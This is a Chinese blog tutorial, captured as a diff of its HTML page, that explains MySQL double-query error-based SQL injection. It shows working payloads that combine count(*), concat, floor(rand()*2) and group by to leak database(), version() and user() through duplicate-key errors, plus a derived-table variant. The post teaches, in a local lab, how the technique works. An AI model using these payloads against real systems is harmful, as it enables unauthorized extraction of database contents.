@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>详细讲解双查询注入</title>
+  <meta property="og:title" content="详细讲解双查询注入" />
+  <meta name="twitter:title" content="详细讲解双查询注入" />
+  <meta name="description" content="上一篇文章中，http://leaver.me/archives/2726.html
+我说双查询很难讲清楚，这次就试着讲一下。读了一些原理性的东西。然后尽量通俗的给大家讲清楚。。
+在此之前，我们理解一下子查询，查询的关键字是select，这个大家都知道。子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。
+看一个简单的例子：
+Select concat((select database())); 真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的数据库查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。
+原理：
+双注入查询需要理解四个函数/语句 1. Rand() //随机函数 2. Floor() //取整函数 3. Count() //汇总函数 4. Group by clause //分组语句
+简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。
+以本地一个名为Security的数据库为例 首先在bt5下的命令行下输入
+mysql -u root –p toor 就会连接上数据库了。 然后通过use security； 就可以切换到security数据库了。因为一个服务器上可能有多个数据库嘛。 
+然后我们执行一下前面那个简单的子查询的例子
+SELECT concat((select database())); 就能显示security，也就是显示了当前数据库的名字了。 然后我们测试一下concat的用法。输入
+SELECT concat(&#39;string1&#39;,&#39;string2&#39;); 显然结果就是string1string2了
+ 然后我们测试一下rand()这个随机函数是干嘛的
+Select rand(); 我们多执行几次  可以看到，这个函数就是返回大于0，小于1之间的数 然后看看取整函数
+Select floor(1.1123456); [![](/images/4477acaba79cf1464c028cab96e32534d81af2e5.png)](http://leaverimage.b0.upaiyun.com/33520_o.png) 这个函数就是返回小于等于你输入的数的整数。 然后我们看看双注入查询中的一个简单组合。大家从我的上一篇文章中应该也看到了有一个子查询是 SELECT floor(rand()*2); 我们从里向外看。rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0 我们稍微加大一点难度。看这个查询
+SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)); 不要怕。先看最里面的SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.">
+  <meta property="og:description" content="上一篇文章中，http://leaver.me/archives/2726.html
+我说双查询很难讲清楚，这次就试着讲一下。读了一些原理性的东西。然后尽量通俗的给大家讲清楚。。
+在此之前，我们理解一下子查询，查询的关键字是select，这个大家都知道。子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。
+看一个简单的例子：
+Select concat((select database())); 真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的数据库查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。
+原理：
+双注入查询需要理解四个函数/语句 1. Rand() //随机函数 2. Floor() //取整函数 3. Count() //汇总函数 4. Group by clause //分组语句
+简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。
+以本地一个名为Security的数据库为例 首先在bt5下的命令行下输入
+mysql -u root –p toor 就会连接上数据库了。 然后通过use security； 就可以切换到security数据库了。因为一个服务器上可能有多个数据库嘛。 
+然后我们执行一下前面那个简单的子查询的例子
+SELECT concat((select database())); 就能显示security，也就是显示了当前数据库的名字了。 然后我们测试一下concat的用法。输入
+SELECT concat(&#39;string1&#39;,&#39;string2&#39;); 显然结果就是string1string2了
+ 然后我们测试一下rand()这个随机函数是干嘛的
+Select rand(); 我们多执行几次  可以看到，这个函数就是返回大于0，小于1之间的数 然后看看取整函数
+Select floor(1.1123456); [![](/images/4477acaba79cf1464c028cab96e32534d81af2e5.png)](http://leaverimage.b0.upaiyun.com/33520_o.png) 这个函数就是返回小于等于你输入的数的整数。 然后我们看看双注入查询中的一个简单组合。大家从我的上一篇文章中应该也看到了有一个子查询是 SELECT floor(rand()*2); 我们从里向外看。rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0 我们稍微加大一点难度。看这个查询
+SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)); 不要怕。先看最里面的SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.">
+  <meta name="twitter:description" content="上一篇文章中，http://leaver.me/archives/2726.html
+我说双查询很难讲清楚，这次就试着讲一下。读了一些原理性的东西。然后尽量通俗的给大家讲清楚。。
+在此之前，我们理解一下子查询，查询的关键字是select，这个大家都知道。子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。
+看一个简单的例子：
+Select …">
+  <meta name="author" content="bystander"/>
+  <link href='https://leizhiyuan.github.io/images/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://leizhiyuan.github.io/2013/03/03/%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="bystander&#39;s blog" />
+
+  <meta name="generator" content="Hugo 0.49.2" />
+  <link rel="canonical" href="https://leizhiyuan.github.io/2013/03/03/%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" />
+  <link rel="alternate" href="https://leizhiyuan.github.io/index.xml" type="application/rss+xml" title="bystander&#39;s blog">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://leizhiyuan.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://leizhiyuan.github.io/">bystander&#39;s blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="首页" href="/">首页</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="目录" href="/categories">目录</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="标签" href="/tags">标签</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="关于我" href="/about/">关于我</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="bystander&#39;s blog" href="https://leizhiyuan.github.io/">
+            <img class="avatar-img" src="https://leizhiyuan.github.io/images/author.jpg" alt="bystander&#39;s blog" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>详细讲解双查询注入</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on March 3, 2013
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (184 words)
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <p>上一篇文章中，<a href="http://leaver.me/archives/2726.html">http://leaver.me/archives/2726.html</a></p>
+
+<p>我说双查询很难讲清楚，这次就试着讲一下。读了一些原理性的东西。然后尽量通俗的给大家讲清楚。。</p>
+
+<p>在此之前，我们理解一下子查询，查询的关键字是select，这个大家都知道。子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。</p>
+
+<p>看一个简单的例子：</p>
+
+<pre class="lang:default decode:true " >Select concat((select database()));</pre> 
+
+<p>真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的数据库查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。</p>
+
+<p>原理：</p>
+
+<p>双注入查询需要理解四个函数/语句
+1. Rand()  //随机函数
+2. Floor()  //取整函数
+3. Count()  //汇总函数
+4. Group by clause //分组语句</p>
+
+<p>简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
+
+<p>以本地一个名为Security的数据库为例
+首先在bt5下的命令行下输入</p>
+
+<pre class="lang:default decode:true " >mysql -u root –p toor</pre> 
+
+<p>就会连接上数据库了。
+然后通过use security； 就可以切换到security数据库了。因为一个服务器上可能有多个数据库嘛。
+<a href="http://leaverimage.b0.upaiyun.com/33517_o.png"><img src="/images/522ac49ec64d3b7735b3dc208564de22477e4aba.png" alt="" /></a></p>
+
+<p>然后我们执行一下前面那个简单的子查询的例子</p>
+
+<pre class="lang:default decode:true " >SELECT concat((select database()));</pre> 
+
+<p>就能显示security，也就是显示了当前数据库的名字了。
+然后我们测试一下concat的用法。输入</p>
+
+<pre class="lang:default decode:true " >SELECT concat('string1','string2');</pre> 
+
+<p>显然结果就是string1string2了</p>
+
+<p><a href="http://leaverimage.b0.upaiyun.com/33518_o.png"><img src="/images/a8be70e4ddb999500369b44191c7c188b4ecf651.png" alt="" /></a>
+然后我们测试一下rand()这个随机函数是干嘛的</p>
+
+<pre class="lang:default decode:true " >Select rand();</pre> 
+
+<p>我们多执行几次
+ <a href="http://leaverimage.b0.upaiyun.com/33519_o.png"><img src="/images/ab02015d63c2fc6d0af98492ae791d58a7665000.png" alt="" /></a>
+可以看到，这个函数就是返回大于0，小于1之间的数
+然后看看取整函数</p>
+
+<pre class="lang:default decode:true " >Select floor(1.1123456);</pre> 
+[![](/images/4477acaba79cf1464c028cab96e32534d81af2e5.png)](http://leaverimage.b0.upaiyun.com/33520_o.png)
+这个函数就是返回小于等于你输入的数的整数。
+
+然后我们看看双注入查询中的一个简单组合。大家从我的上一篇文章中应该也看到了有一个子查询是
+
+<pre class="lang:default decode:true " >SELECT floor(rand()*2);</pre> 
+
+<p>我们从里向外看。rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0
+我们稍微加大一点难度。看这个查询</p>
+
+<pre class="lang:default decode:true " >SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</pre> 
+
+<p>不要怕。先看最里面的SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.然后把这两个的结果进行concat连接，那么结果不是security0就是security1了。</p>
+
+<p><a href="http://leaverimage.b0.upaiyun.com/33521_o.png"><img src="/images/f29b4115541e053c2e100bc7a35cdd51aaa9c2e5.png" alt="" /></a>
+如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条
+<a href="http://leaverimage.b0.upaiyun.com/33522_o.png"><img src="/images/d272e51a8be57b8739ab1c63516af31cd795f6ab.png" alt="" /></a>
+如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。这里本机有三个数据库。所以会返回三个结果</p>
+
+<p><a href="http://leaverimage.b0.upaiyun.com/33523_o.png"><img src="/images/8c67270890234e1d851d71c02e44e7511cedcdbd.png" alt="" /></a></p>
+
+<p>现在我们准备加上Group By 语句了。
+我们使用information_schema.tables 或 information_schema.columns者两个表来查询。因为表里面一般数据很多。容易生成很多的随机值，不至于全部是security0，这样就不能查询出结果了。</p>
+
+<pre class="lang:default decode:true " >select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</pre> 
+
+<p>这里我先解释一下。我们把concat((select database()), floor(rand()*2)) 这个结果取了一个别名 a ，然后使用他进行分组。这样相同的security0分到一组，security1分到一组。就剩下两个结果了。
+ <a href="http://leaverimage.b0.upaiyun.com/33524_o.png"><img src="/images/c9ad11cc6de49646801b61d3143e1fa9c5d0b0af.png" alt="" /></a></p>
+
+<p>注意。这里的database()可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询。比如查表啊。查列啊。原理都是一样的。</p>
+
+<p>最后的亮点来了。。
+我们输入这条：注意多了一个聚合函数count(*)</p>
+
+<pre class="lang:default decode:true " >select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</pre> 
+[![](/images/03af307809c7bcdfd4f77d3551d39e1d7fa7e515.png)](http://leaverimage.b0.upaiyun.com/33525_o.png)
+
+报错了
+
+<pre class="lang:default decode:true " >ERROR 1062 (23000): Duplicate entry 'security1' for key ‘group_key’</pre> 
+
+<p>重复的键值 可以看到security就是我们的查询结果了
+想要查询版本就这样：</p>
+
+<pre class="lang:default decode:true " >select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;</pre> 
+
+<p>看看替换了database()为version()
+ <a href="http://leaverimage.b0.upaiyun.com/33527_o.png"><img src="/images/b4e9f38f4533442b15107ce4b92d7d9d370bc934.png" alt="" /></a>
+再看一个</p>
+
+<pre class="lang:default decode:true " >select count(*), concat('~',(select user()),'~', floor(rand()*2))as a from information_schema.tables group by a;</pre> 
+
+<p>报错</p>
+
+<pre class="lang:default decode:true " >ERROR 1062 (23000): Duplicate entry '~root@localhost~1' for key 'group_key'</pre> 
+
+<p>这里的~这个符号只是为了让结果更清晰。</p>
+
+<p>这里还有一个比较复杂的。叫做派生表。需要使用
+select 1 from (table name); 这样的语法来报错，具体就是</p>
+
+<pre class="lang:default decode:true " >select 1 from (select count(*), concat('~',(select user()),'~', floor(rand()*2))as a from information_schema.tables group by a)x;</pre> 
+
+<p>来报错。</p>
+
+<p>大家可以对照我上一篇文章来看。相信讲的还算清楚。</p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://leizhiyuan.github.io//tags/mysql/">mysql</a>&nbsp;
+            
+              <a href="https://leizhiyuan.github.io//tags/%E4%BA%92%E8%81%94%E7%BD%91/">互联网</a>&nbsp;
+            
+              <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+            
+              <a href="https://leizhiyuan.github.io//tags/%E5%AE%89%E5%85%A8/">安全</a>&nbsp;
+            
+          </div>
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://leizhiyuan.github.io/2013/03/01/c#%E4%B8%AD%E7%9A%84debug%E7%B1%BB/" data-toggle="tooltip" data-placement="top" title="C#中的Debug类">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://leizhiyuan.github.io/2013/03/06/e.net-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8C%87%E5%8D%97/" data-toggle="tooltip" data-placement="top" title="[E].Net 多线程指南">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+        
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "leaverme" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/leizhiyuan" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="https://leizhiyuan.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="leaver.me">bystander</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;
+          2018
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://leizhiyuan.github.io/">bystander&#39;s blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.49.2</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://leizhiyuan.github.io/js/main.js"></script>
+<script src="https://leizhiyuan.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://leizhiyuan.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
